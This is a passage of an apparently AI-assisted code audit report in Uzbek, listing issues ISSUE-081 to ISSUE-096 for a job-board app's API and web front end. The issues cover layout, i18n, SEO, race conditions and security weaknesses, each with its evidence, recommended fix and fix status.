- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** monetization/cleanup
- **Fayl:** `apps/api/prisma/schema.prisma:735`
- **Root cause:** schema.prisma:735-753 SubscriptionPlan, :755-773 Payment (transactionId unique, (companyId,status) indeks), :318-319,325,329,335 Company maydonlari, :144-153 enum'lar. tizim-arxitekturasi.md:545 'sxemada qoladi'. MongoDB'da bo'sh kolleksiya xarajatsiz; `prisma db push` migratsiyasiz.
- **Impact:** Ta'sir yo'q — hujjatlashtirilgan qaror. Faqat CHANGELOG.md:370,376-378 tarixiy 'migratsiya' yozuvlari PostgreSQL davridan qolgan (tizim-arxitekturasi.md ham PostgreSQL deb yozadi) — bu boshqa dimension.
- **Evidence:** schema.prisma:318-319; :735-773; tizim-arxitekturasi.md:545.
- **Recommended fix:** QOLDIRING. Sxema izohiga 'monetizatsiya o'chiq — features.billing' eslatmasi qo'shish kifoya. Kelajakda tozalash: Company'dan subscription maydonlari olib tashlansa admin.routes.ts:317,331-332 va demo-seed.ts:1672-1673 ham o'zgaradi.
- **Dependencies:** Yo'q.
- **Risk:** Yo'q.
- **Bajarilgan fix:** Monetizatsiya bayroq ortida o'chiq; kod, sxema va admin to'lov ro'yxati saqlandi.
- **Test/dalil:** e2e `/api/plans` 404 PASS
- **Birlashtirilgan manbalar (6):**
  - R235 [monetization, P3] `apps/api/prisma/schema.prisma:735` — SubscriptionPlan/Payment modellari va Company.subscriptionPlanId/subscriptionExpiresAt — arxitektura §14 bo'yicha qoladi (o'chirmang)
  - R236 [monetization, P3] `apps/api/src/modules/admin/admin.routes.ts:428` — Admin to'lovlar paneli, overview 'Daromad' kartasi va kompaniyalar 'Tarif' ustuni — admin-only, lekin bepul platformada bo'sh/chalg'ituvchi
  - R237 [monetization, P3] `apps/api/src/modules/admin/admin.routes.ts:258` — isPremium = admin qo'lda qo'yadigan 'featured' belgisi — ochiq UI badge/filter/sort product rule'ga mos, faqat 'Premium' nomi pullik obunani nazarda tutadi
  - R238 [monetization, P3] `apps/api/src/prisma/demo-seed.ts:1672` — Demo seed kompaniyalarga obuna rejasi va 11 ta to'lov yozuvi biriktiradi — demo hr'da nomzodlar gate'i yashiringan
  - R240 [monetization, P3] `apps/web/src/lib/i18n/messages.uz.ts:421` — Support 'payments' kategoriyasi ('To'lov va narxlar — Tariflar va to'lovlar') bo'sh, lekin i18n/type'larda saqlanadi
  - R241 [monetization, P3] `apps/web/src/pages/pricing/+Page.tsx:1` — pages/pricing/* to'liq dead code: +guard 302 qiladi, +Page/+data/+Head/+title, apiExtra fetchPlans/fetchSubscription/fetchMyPayments/startCheckout va i18n pricing/pricingExtra hech qachon render bo'lmaydi

### ISSUE-081

**Responsive mayda: 100vh (dvh emas), tor sidebar sarlavhasida whitespace-nowrap, grid-cols-1 qoidasi, illyustratsiyalarning tungi varianti**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** PLAUSIBLE (audit agenti topgan, mustaqil qayta tekshirilmagan)
- **Holat:** NOT FIXED
- **Area:** responsive
- **Fayl:** `apps/web/src/components/dashboard/SidebarCards.tsx:37`
- **Root cause:** h2 `whitespace-nowrap`, ota flex-wrap esa faqat havolani pastga tushiradi. Sarlavhaning o'zi uzun bo'lsa sinmaydi, `min-w-0`/`truncate` ham yo'q.
- **Impact:** Uzun ruscha sarlavhalarda karta chegarasidan chiqib ketish yoki gorizontal toshish ehtimoli bor.
- **Evidence:** dashboard/SidebarCards.tsx:36 izoh 'Tor panelda (300px) sarlavha ikki qatorga bo'linmasin', :37 `<h2 id={id} className={`${SIDEBAR_TITLE} whitespace-nowrap`}>`.
- **Recommended fix:** `whitespace-nowrap` o'rniga `min-w-0 truncate` (va `title`) ishlating yoki sinishiga ruxsat bering. Uch tildagi eng uzun sarlavhani 300px'da brauzerda tekshiring.
- **Dependencies:** i18n messages.ru.ts sarlavha uzunliklari.
- **Risk:** Juda past.
- **Bajarilgan fix:** Responsive mayda muammolar alohida tuzatilmadi; brauzer regressiyasi natijasi FINAL_AUDIT.md da.
- **Test/dalil:** brauzer regressiyasi — FINAL_AUDIT.md
- **Birlashtirilgan manbalar (4):**
  - R250 [responsive-dark-a11y, P3] `apps/web/src/components/dashboard/SidebarCards.tsx:37` — Tor (300px) sidebar sarlavhasiga whitespace-nowrap berilgan: ru/en tarjimada toshishi mumkin
  - R251 [responsive-dark-a11y, P3] `apps/web/src/components/employer/applications/EmployerApplicationsView.tsx:273` — DESIGN.md 'aylanadigan qator bor grid'ga grid-cols-1' qoidasi bir nechta grid'da qo'llanmagan
  - R252 [responsive-dark-a11y, P3] `apps/web/src/components/notifications/NotificationsHeader.tsx:47` — Sahifa illyustratsiyalarining ko'pida tungi variant/moslashuv yo'q, drop-shadow rangi hardcoded
  - R253 [responsive-dark-a11y, P3] `apps/web/src/pages/vacancies/+Page.tsx:134` — Sticky yon panellar va form sidebar'da 100vh ishlatilgan (dvh emas)

### ISSUE-082

**Google tokeninfo so'rovida timeout yo'q (tarmoq xatosi 500), iss tekshirilmaydi**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** auth/google
- **Fayl:** `apps/api/src/modules/auth/auth.service.ts:301`
- **Root cause:** verifyGoogleCredential (auth.service.ts:300-311) `fetch` AbortSignal/timeout'siz; `fetch` throw qilsa AppError emas -> server.ts:533-534 500 "Kutilmagan xatolik". aud va email_verified tekshiriladi (yaxshi), `iss` (accounts.google.com) va `exp` tokeninfo'ga ishonib qoldirilgan (tokeninfo muddati o'tgan tokenni 400 bilan rad etadi — qabul qilinadi). Foydalanuvchi Google `sub` bilan emas, faqat email bilan bog'lanadi.
- **Impact:** Google sekin javob bersa so'rov osilib qoladi (Fastify default timeout'siz), foydalanuvchi noaniq 500 ko'radi (EMPTY≠ERROR ruhida — bu holat 503 GOOGLE_UNAVAILABLE bo'lishi kerak). Email o'zgargan Google hisobi yangi hisob sifatida ochiladi.
- **Evidence:** apps/api/src/modules/auth/auth.service.ts:300-311; apps/api/src/server.ts:529-534.
- **Recommended fix:** `fetch(url, { signal: AbortSignal.timeout(5000) })`, catch'da `new AppError(503, "GOOGLE_UNAVAILABLE", ...)`; `info.iss` ni `https://accounts.google.com`/`accounts.google.com` bilan tekshiring; User'ga ixtiyoriy `googleSub String?` qo'shish (keyinchalik).
- **Dependencies:** Node 20 AbortSignal.timeout mavjud.
- **Risk:** Past.
- **Bajarilgan fix:** Google tokeninfo so'rovi 5 s timeout bilan (503), `iss` tekshiriladi.
- **Test/dalil:** API typecheck/build PASS

### ISSUE-083

**Access token localStorage'da (XSS bo'lsa 15 daqiqalik token o'g'irlanadi) — hujjatlashtirilgan tradeoff**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** security/tradeoff
- **Fayl:** `apps/web/src/components/AuthContext.tsx:16`
- **Root cause:** AuthContext.tsx:16,55,80,88 `localStorage["ish-top:accessToken"]`. Refresh httpOnly (yaxshi). Helmet CSP faqat API javoblariga (server.ts:449-478), web (Vercel) tomonida CSP yo'qligi bu audit doirasida tekshirilmadi. Token muddati qisqa (15m) va refresh httpOnly bo'lgani uchun zarar chegaralangan.
- **Impact:** Stored XSS (boshqa dimension) bo'lsa tokenni 15 daqiqa ichida ishlatish mumkin; refresh o'g'irlanmaydi. Qabul qilinadigan risk, lekin in-memory saqlash + cookie-based refresh bilan yanada kamaytiriladi.
- **Evidence:** apps/web/src/components/AuthContext.tsx:16,37-66; apps/api/src/server.ts:449-478.
- **Recommended fix:** Hozircha o'zgartirmaslik mumkin. Kelajakda: tokenni faqat xotirada saqlash (mount'da har doim refresh — cookie bor), localStorage'ni tashlab yuborish; web tomonida CSP (vercel.json headers). #2 (kuchli secret) bu riskning ta'sirini kamaytiradi.
- **Dependencies:** #2; frontend hosting CSP.
- **Risk:** O'rta (in-memory'ga o'tishda mount'da har doim bitta refresh so'rovi qo'shiladi).
- **Bajarilgan fix:** Access token `localStorage` da qoldi (arxitektura o'zgarishi; web CSP bilan birga ko'rib chiqilishi kerak).
- **Test/dalil:** —

### ISSUE-084

**POST /api/push/subscribe endpoint bo'yicha upsert boshqa foydalanuvchining obunasini o'ziga o'tkazadi**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** authz/push
- **Fayl:** `apps/api/src/modules/notifications/notifications.routes.ts:332`
- **Root cause:** `pushSubscription.upsert({ where: { endpoint }, update: { userId: req.user.sub, ... } })` — endpoint mavjud bo'lsa egasi tekshirilmasdan joriy userga o'tkaziladi. Endpoint URL'lari brauzer tomonidan yaratiladi (taxminlash qiyin), lekin bir qurilmada ikki hisob yoki endpoint sizgan holatda kuchga kiradi.
- **Impact:** Jabrlanuvchi push bildirishnomalarini yo'qotadi (kalitlar hujumchiniki bo'lgani uchun o'qiy olmaydi — asosan DoS). Past xavf.
- **Evidence:** notifications.routes.ts:332-347.
- **Recommended fix:** `deleteMany({ where: { endpoint, userId: { not: me } } })` so'ng upsert; yoki unique'ni (`userId`, `endpoint`) juftligiga ko'chirish.
- **Dependencies:** schema.prisma:783 `endpoint @unique` — o'zgartirilsa `prisma db push`.
- **Risk:** Past.
- **Bajarilgan fix:** Push obunasi boshqa foydalanuvchining yozuvini o'ziga ko'chirmaydi — eski egasi yozuvi o'chiriladi.
- **Test/dalil:** API typecheck/build PASS; push test muhitida o'chiq (NOT RUN)

### ISSUE-085

**Bosh sahifa vakansiya kartasida ish joylashuvi ko'rsatilmaydi**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** ui/home
- **Fayl:** `apps/web/src/components/VacancyCard.tsx:81`
- **Root cause:** (1) Bosh sahifa eski VacancyCard'dan foydalanadi: faqat experience · employment ko'rsatiladi, workplaceType e'tiborsiz (47-50, 81-85). /vacancies'dagi yangi karta esa ko'rsatadi (components/vacancies/VacancyCard.tsx:41-50). (2) CountUp suffix="+" real sonni oshirib ko'rsatadi ("5+", "0+") (index/+Page.tsx:323). (3) GET /api/companies/:slug har sharh uchun userId qaytaradi (companies.routes.ts:189), bu faqat "mine" belgisi uchun ishlatiladi.
- **Impact:** Masofaviy va hududsiz vakansiya bosh sahifada joylashuvsiz ko'rinadi (bir sahifada ikki xil karta). "+" to'qima tuyulishini beradi. Ochiq reviewer userId'lari ko'rinadi (PDF fayl nomi ham userId'ga bog'liq).
- **Evidence:** components/VacancyCard.tsx:81-85 {t.enums.experience[...]} · {t.enums.employment[...]}; grep workplace → yo'q; index/+Page.tsx:323 <CountUp value={value} suffix="+" />; companies.routes.ts:189 userId: true.
- **Recommended fix:** Bosh sahifada components/vacancies/VacancyCard'ni ishlatish (saved/onToggleSave bilan). suffix'ni olib tashlash. Sharhlarda userId o'rniga optional auth bilan `mine: boolean` hisoblash, yoki userId'ni faqat so'rovchi o'zi bo'lsa qaytarish.
- **Dependencies:** useFavorites API'si yangi karta prop nomlariga moslanadi
- **Risk:** Past.
- **Bajarilgan fix:** Bosh sahifa kartasida ish joylashuvi — arzimas emas (boshqa karta komponenti), qilinmadi.
- **Test/dalil:** —

### ISSUE-086

**find-then-create poygasi: parallel ariza yoki suhbat ochishda ikkinchi so'rov 409 oladi (idempotent 200 kutiladi)**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** api/race
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:310`
- **Root cause:** Mavjudlik `findUnique/findFirst` bilan tekshirilib keyin `create` — parallel ikki so'rovda ikkinchisi unique indeksga urilib Prisma P2002 tashlaydi, u 500 sifatida qaytadi (upsert/catch yo'q).
- **Impact:** Ikki marta bosish/ikki tab'da 500 (foydalanuvchi 'xato' ko'radi, aslida yozuv bor). Xavfsiz holat tamoyili buziladi, ma'lumot yo'qolmaydi.
- **Evidence:** chat.routes.ts:310-322 getOrCreateConversation; applications.routes.ts:52-65; reviews.routes.ts:995-1012. schema.prisma:505, 465, 725 unique indekslar.
- **Recommended fix:** `upsert` (where unique compound, update: {}, create) yoki `create` ni try/catch P2002 → mavjudni qaytarish. Application uchun: `create` → catch P2002 → `findUnique` → 200.
- **Dependencies:** —
- **Risk:** Juda past.
- **Bajarilgan fix:** Parallel ariza: P2002 ushlanib mavjud ariza 200 bilan qaytadi.
- **Test/dalil:** e2e `[ISSUE-086]` PASS

### ISSUE-087

**PUT va PATCH status vakansiyada requirePhoneVerified yo'q (POST'da bor)**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** authz/phone
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:148`
- **Root cause:** POST /api/vacancies `requirePhoneVerified`ni talab qiladi (133), PUT (148) va PATCH (197) esa yo'q: telefoni tasdiqlanmagan hisob eski draft'ni faollashtira oladi. Apply'da findFirst→create ketma-ketligi parallel so'rovda unique indeksga uriladi, P2002 → 409 'Bu yozuv allaqachon mavjud', holbuki kutilgan idempotent javob 200 (applications.routes.ts:52-65).
- **Impact:** Kichik siyosat nomuvofiqligi. Ikki marta bosishda nomzod xato xabarini ko'radi.
- **Evidence:** vacancies.routes.ts:133, 148, 197; applications.routes.ts:52-65; server.ts:127-129.
- **Recommended fix:** PATCH status→active'ga requirePhoneVerified qo'shish. Apply'da P2002'ni ushlab, mavjud arizani 200 bilan qaytarish.
- **Dependencies:** Yo'q
- **Risk:** Past
- **Bajarilgan fix:** `PATCH status → active` telefon tasdig'ini talab qiladi. `PUT` (tahrirlash) hali talab qilmaydi.
- **Test/dalil:** PHASE 6: e2e `[PHASE6-U31]` telefoni tasdiqlanmagan ish beruvchi qayta faollashtirishda 403 `PHONE_NOT_VERIFIED` — PASS

### ISSUE-088

**DESIGN.md bilan farqlar: markViewed optimistik, 'Moderatsiyada' kartasi employer uchun erishib bo'lmaydigan holat**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** docs/design
- **Fayl:** `apps/web/src/components/employer/applications/EmployerApplicationsView.tsx:130`
- **Root cause:** DESIGN.md:109 'Holat server javobidan keyin yangilanadi' deydi, lekin markViewed holatni avval lokal o'zgartiradi va xatoda jimgina qaytaradi (127-134). DESIGN.md:66 5 ta statistika kartasida 'Moderatsiyada'ni ko'rsatadi, lekin employer yo'lida hech narsa bu holatni qo'ymaydi (vacancies.service.ts:435). 'Yopilgan' (archived) kartasi yo'q, garchi bu employer uchun real holat bo'lsa ham (VacancyStats.tsx:7-14).
- **Impact:** Spetsifikatsiya va xulq mos emas. 'Moderatsiyada 0' doimiy shovqin bo'ladi, 'Yopilgan'ni esa faqat toolbar orqali topish mumkin.
- **Evidence:** EmployerApplicationsView.tsx:127-134; DESIGN.md:66, 109; VacancyStats.tsx:7-14; vacancies.service.ts:435-458.
- **Recommended fix:** DESIGN.md'da markViewed'ni 'optimistik, xatoda qaytariladi' deb hujjatlash (yoki kodni server javobidan keyin yangilashga o'tkazish). Rejected→moderation fix'i qabul qilinsa 'Moderatsiyada' kartasi mazmunli bo'ladi. Aks holda kartani 'Yopilgan' bilan almashtirish va DESIGN'ni yangilash.
- **Dependencies:** Rad etilgan vakansiya holat mashinasi topilmasi
- **Risk:** Past
- **Bajarilgan fix:** DESIGN.md dagi "bepul tarifda 3 ta" jumlasi tuzatildi.
- **Test/dalil:** Hujjat ko'rib chiqildi

### ISSUE-089

**Masofaviy vakansiyani tahrirlashda regionId doim null yuboriladi; API yangi e'londa employmentType 'remote' ni hali qabul qiladi**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** product/workplace
- **Fayl:** `apps/web/src/lib/employer/vacancies/form.ts:209`
- **Root cause:** toVacancyPayload remote'da `regionId: edit ? null : undefined` yuboradi. Rule 2 va backend (`assertVacancyPlacement`) remote'da hududni ixtiyoriy deb biladi, e2e-check.mjs:739 'remoteWithRegion' holatini sinaydi. createSchema/updateSchema'da `employmentType: 'remote'` hali ruxsat (vacancies.routes.ts:50), UI esa yangi e'londa uni yashiradi (form.ts:29-31).
- **Impact:** Hududi bor eski masofaviy e'lon istalgan maydon tahrirlanganda hududini jimgina yo'qotadi. API orqali yangi e'lonlarga employmentType=remote va workplaceType=office kabi qarama-qarshi kombinatsiya yozilishi mumkin.
- **Evidence:** form.ts:34, 128, 209; vacancies.routes.ts:48-50, 156, 168; vacancies.rules.ts:26.
- **Recommended fix:** Edit'da remote bo'lsa, foydalanuvchi hududni o'zgartirmagan bo'lsa regionId'ni yubormaslik (undefined), shunda saqlangan qiymat qoladi. API'da `employmentType === 'remote' && workplaceType && workplaceType !== 'remote'` bo'lsa 400 berish (faqat yangi yoki yangilanayotgan yozuvlar uchun).
- **Dependencies:** DESIGN.md:129 ('masofaviyda yashiriladi va yuborilmaydi') bilan kelishish.
- **Risk:** Past
- **Bajarilgan fix:** Masofaviy vakansiya tahririda hudud yuborilishi o'zgartirilmadi.
- **Test/dalil:** —

### ISSUE-090

**Cleanup'siz setTimeout'lar, useClickOutside har renderda qayta obuna, useSalaryCatalogs cancel'siz va xatoda jim, useFavorites.toggle har o'zgarishda yangi identity va closure'dagi eski ids**

- **Severity:** P3 (agent bahosi: P2, P3)
- **Verdict:** PLAUSIBLE (audit agenti topgan, mustaqil qayta tekshirilmagan)
- **Holat:** PARTIAL
- **Area:** frontend/cleanup
- **Fayl:** `apps/web/src/components/SaveSearchButton.tsx:118`
- **Root cause:** SaveSearchButton.tsx:118-121, FavoriteButton.tsx:35, EmployerCompanyForm.tsx:93, ContactForm.tsx:114, useMessenger.ts:197 (`emitInboxChanged` 500ms) — taymerlar ref'da saqlanmaydi va unmount'da tozalanmaydi. React 18 ogohlantirmaydi, lekin sahifa almashganda keraksiz ish va (useMessenger) navigatsiyadan keyin event.
- **Impact:** Polish: konsol shovqini yo'q, lekin naqsh nomuvofiq (useShare.ts:37-38 va useNotice.ts to'g'ri qilingan).
- **Evidence:** SaveSearchButton.tsx:118 `window.setTimeout(() => { setOpen(false); setDone(false); }, 1600)`; FavoriteButton.tsx:35.
- **Recommended fix:** useShare.ts naqshi: `timer = useRef<number>()` + `useEffect(() => () => clearTimeout(timer.current), [])`.
- **Dependencies:** Yo'q.
- **Risk:** Past.
- **Bajarilgan fix:** `useFavorites` ref naqshiga o'tdi (R138). Qolgan setTimeout/useClickOutside tozalashlari qilinmadi.
- **Test/dalil:** web typecheck/build PASS
- **Birlashtirilgan manbalar (4):**
  - R221 [frontend-state, P3] `apps/web/src/components/SaveSearchButton.tsx:118` — Cleanup'siz setTimeout'lar — unmount'dan keyin setState
  - R222 [frontend-state, P3] `apps/web/src/lib/salaries/useSalaryStats.ts:61` — useSalaryCatalogs: kataloglar so'rovi cancel flag'siz va xatoda jimgina bo'sh
  - R223 [frontend-state, P3] `apps/web/src/lib/useClickOutside.ts:29` — useClickOutside har renderda qayta obuna bo'ladi (inline callback deps)
  - R138 [frontend-state, P2] `apps/web/src/lib/useFavorites.ts:65` — useFavorites.toggle har o'zgarishda yangi identity oladi va closure'dagi `ids` ga tayanadi

### ISSUE-091

**i18n mayda: 404'da til almashtirish bosh sahifaga olib ketadi, raqamlar hamma tilda ru-RU, til cookie o'lik kod, terminologiya, 'so'm dan', chat timezone, toLocaleDateString, qattiq yozilgan placeholder'lar**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** PLAUSIBLE (audit agenti topgan, mustaqil qayta tekshirilmagan)
- **Holat:** NOT FIXED
- **Area:** i18n
- **Fayl:** `apps/web/src/components/LanguageSwitcher.tsx:19`
- **Root cause:** Switcher pageContext.localePathname'ni to'g'ridan-to'g'ri o'qiydi. render(404) bilan chizilgan xato sahifasida bu maydon bo'lmaydi (pageLocale.ts izohi aynan shu holatni tushuntiradi) va fallback '/' ga tushadi.
- **Impact:** /ru/vacancies/eski-slug 404 sahifasida EN tanlansa foydalanuvchi /en/vacancies/eski-slug o'rniga /en ga tushadi. Kichik UX.
- **Evidence:** LanguageSwitcher.tsx:19 `(pageContext.localePathname as string) || "/"`; lib/i18n/pageLocale.ts:4-17 (URL'dan tiklash logikasi bor, lekin switcher uni ishlatmaydi).
- **Recommended fix:** `const logical = pageLocale(pageContext).pathname;` ishlating.
- **Risk:** Juda past
- **Bajarilgan fix:** i18n mayda bandlari qilinmadi.
- **Test/dalil:** —
- **Birlashtirilgan manbalar (8):**
  - R225 [i18n, P3] `apps/web/src/components/LanguageSwitcher.tsx:19` — Xato (404) sahifasida til almashtirish bosh sahifaga olib ketadi
  - R227 [i18n, P3] `apps/web/src/lib/format.ts:3` — Raqamlar hamma tilda ru-RU formatida (EN'da '1 207' bo'ladi, '1,207' emas)
  - R228 [i18n, P3] `apps/web/src/lib/i18n/config.ts:68` — Til cookie'si hech qachon yozilmaydi va o'qilmaydi (persistLocale/resolveLocale o'lik kod)
  - R229 [i18n, P3] `apps/web/src/lib/i18n/messages.uz.ts:2536` — Terminologiya nomuvofiq: 'ariza' / 'murojaat', 'nomzod' / 'ish izlovchi', EN 'candidate' / 'applicant' / 'job seeker'
  - R230 [i18n, P3] `apps/web/src/lib/i18n/messages.uz.ts:796` — O'zbekcha maosh qo'shimchasi alohida yozilgan: "so'm dan" / "so'm gacha"
  - R231 [i18n, P3] `apps/web/src/lib/messages/format.ts:42` — Chat vaqti brauzer timezone'ida, formatDate esa Asia/Tashkent'da. EN tegi ikki joyda turlicha
  - R232 [i18n, P3] `apps/web/src/pages/admin/users/+Page.tsx:121` — toLocaleDateString() locale va timezone'siz: brauzer tilida, formatDate'ga mos kelmaydi
  - R233 [i18n, P3] `apps/web/src/pages/signup/+Page.tsx:92` — Qattiq yozilgan user-facing satrlar: placeholder va aria-label'lar t.* orqali emas

### ISSUE-092

**robots.txt'da mavjud bo'lmagan /dashboard, /account; noindex sahifalar bir vaqtda Disallow**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** seo/robots
- **Fayl:** `apps/api/src/modules/seo/seo.routes.ts:28`
- **Root cause:** PRIVATE_PATHS'da /dashboard va /account bor, lekin bunday sahifalar yo'q. /login, /signup, /profile va boshqa sahifalar bir vaqtda ham noindex meta'ga ega (login/+Head.tsx:12), ham Disallow qilingan. `/vacancies?q=`, `/companies?saved=1` va cheksiz filtr kombinatsiyalari bloklanmagan.
- **Impact:** Tashqi havolasi bor Disallow sahifalar 'Indexed, though blocked by robots.txt' bo'lib qolishi mumkin. Filtr kombinatsiyalari crawl budget'ni yeydi (20k vakansiya × filtrlar).
- **Evidence:** seo.routes.ts:28-43 PRIVATE_PATHS; pages/ ro'yxatida dashboard/account papkalari yo'q.
- **Recommended fix:** /dashboard va /account'ni olib tashlang. Akkaunt sahifalarini Disallow'dan chiqarib, faqat noindex'ga tayaning (yoki aksincha — izchil bitta usul). `Disallow: /*?*saved=`, `/companies?saved=1` qo'shing. q uchun noindex (canonical finding) yetarli.
- **Dependencies:** Canonical/noindex finding'i
- **Risk:** Past.
- **Bajarilgan fix:** robots.txt dan mavjud bo'lmagan `/dashboard`, `/account` olib tashlandi.
- **Test/dalil:** PHASE 6: e2e `[PHASE6-U31]` robots.txt qoidalari uch tilda — PASS

### ISSUE-093

**_error sahifasida maqola 404 va 500 uchun alohida meta yo'q; 404 sahifada hreflang chiqadi**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** seo/error
- **Fayl:** `apps/web/src/pages/_error/+Head.tsx:20`
- **Root cause:** +Head.tsx:12-20 va +title.ts:9-11 faqat VACANCY/COMPANY_NOT_FOUND'ni tekshiradi, is404 tekshirilmaydi. HeadDefault.tsx:52-55 alternates va x-default barcha sahifalarda, jumladan 404/noindex sahifalarda ham chiqadi.
- **Impact:** Maqola 404 sahifasida umumiy sarlavha chiqadi. 500 sahifada 'Sahifa topilmadi' title/description ko'rinadi. 404 URL'lar uchun hreflang juftliklari Search Console'da 'no return tags'/xato signal beradi. Status kodlari to'g'ri (Vike render(404)), shuning uchun ta'siri kichik.
- **Evidence:** _error/+title.ts:11 `return t.meta.notFound.title;` — is404 tekshiruvisiz; _error/+Page.tsx:19 ARTICLE_NOT_FOUND Page'da bor, Head'da yo'q.
- **Recommended fix:** +Head/+title'ga ARTICLE_NOT_FOUND tarmog'ini (t.articles.detail notFound matnlari) va `pageContext.is404 === false` uchun t.error.title500 tarmog'ini qo'shing. HeadDefault'da `pageContext.is404 !== undefined` (error page) bo'lsa alternates'ni chiqarmang.
- **Dependencies:** —
- **Risk:** Past.
- **Bajarilgan fix:** `_error` head holatlari o'zgartirilmadi.
- **Test/dalil:** —

### ISSUE-094

**Admin vakansiyalar jadvali faol bo'lmagan vakansiyaga ham ochiq sahifa havolasini beradi (404)**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** admin/links
- **Fayl:** `apps/web/src/pages/admin/vacancies/+Page.tsx:115`
- **Root cause:** Havola status'ga qarab gating qilinmaydi. Employer VacancyRow esa `caps.viewPublic` bilan gating qiladi (components/employer/vacancies/VacancyRow.tsx:53,73), favorites/messages/applications `isClosed` bilan (FavoriteVacancyCard.tsx:52, ConversationDetails.tsx:239, ApplicationCard.tsx:65).
- **Impact:** Moderator rad etilgan yoki qoralama vakansiya kontentini ko'rish uchun bosganda 404 oladi, moderatsiya uchun preview yo'q.
- **Evidence:** admin/vacancies/+Page.tsx:114-115 `<a href={l(`/vacancies/${row.slug}`)}>` shartsiz.
- **Recommended fix:** `row.status === 'active'` bo'lsa havola bering, aks holda matn qoldiring yoki admin preview (masalan /admin/vacancies?id=... drawer) oching.
- **Dependencies:** —
- **Risk:** Past.
- **Bajarilgan fix:** Admin vakansiyalar jadvalida havola faqat faol e'londa.
- **Test/dalil:** web typecheck/build PASS

### ISSUE-095

**/employer/@slug har qanday noma'lum segmentni /companies/<segment> ga 301 qiladi**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** routing
- **Fayl:** `apps/web/src/pages/employer/@slug/+guard.ts:15`
- **Root cause:** Statik /employer/vacancies|applications|candidates ustun turadi (Vike static > param), lekin boshqa har qanday so'z kompaniya slug'i deb qabul qilinadi va doimiy (301) redirect beriladi.
- **Impact:** Yozuv xatosi yoki kelajakdagi yangi employer bo'limi (masalan /employer/company) avval brauzer va proxy keshida qoladigan 301 → /companies/company → 404 beradi. Keyin shu nomda statik sahifa qo'shilsa, eski 301 keshi foydalanuvchini noto'g'ri joyga olib boradi.
- **Evidence:** employer/@slug/+guard.ts:12-16 shartsiz `throw redirect(... `/companies/${slug}` ..., 301)`.
- **Recommended fix:** Reserved segmentlar ro'yxatini (profile, settings, company, dashboard, billing, new) guard'da tekshirib, ular uchun render(404) qiling. Ixtiyoriy ravishda slug formatini regex bilan tekshiring.
- **Dependencies:** —
- **Risk:** Past.
- **Bajarilgan fix:** Employer slug catch-all o'zgartirilmadi.
- **Test/dalil:** —

### ISSUE-096

**ADMIN_PASSWORD va boshqa sirlar uchun minimal tekshiruv yo'q; webhook sirlari timing-safe solishtirilmaydi**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** security/config
- **Fayl:** `apps/api/src/common/env.ts:82`
- **Root cause:** env.ts:82 `ADMIN_PASSWORD` uzunligi faqat ensure-admin.ts:32 da (`< 8` → yaratilmaydi) tekshiriladi — 8 belgili admin paroli ruxsat; billing.service.ts:312 `key === env.PAYME_KEY` va :326 `expected === sign_string` — timing-safe emas (tarmoq shovqini tufayli amaliy emas, lekin `crypto.timingSafeEqual` arzon). Telegram bot token URL'da (telegram.service.ts:14) — xatolik loglarida `method` va `description` gina yoziladi (:31), token chiqmaydi — OK. Google: tokeninfo orqali `aud` va `email_verified` tekshiriladi (auth.service.ts:153-164) — OK.
- **Impact:** Zaif admin paroli + login 10/min limit (XFF bilan chetlab o'tiladi) → admin brute-force; webhook'lar bepul platformada ishlatilmaydi (product rule 1), ta'sir past.
- **Evidence:** env.ts:81-82; ensure-admin.ts:32-38; billing.service.ts:301-327.
- **Recommended fix:** `ADMIN_PASSWORD` uchun `.min(12)` (berilgan bo'lsa); `timingSafeEqual` (uzunlik tekshiruvi bilan); login'da email bo'yicha ham rate-limit kaliti.
- **Dependencies:** trustProxy fix'i
- **Risk:** Past
- **Bajarilgan fix:** Production'da JWT sirlari uzunligi va farqliligi majburiy. Boshqa sirlar (SMTP, VAPID) konfiguratsiyasi o'zgarmadi.
- **Test/dalil:** e2e (32+ belgili sirlar bilan) PASS

### ISSUE-097

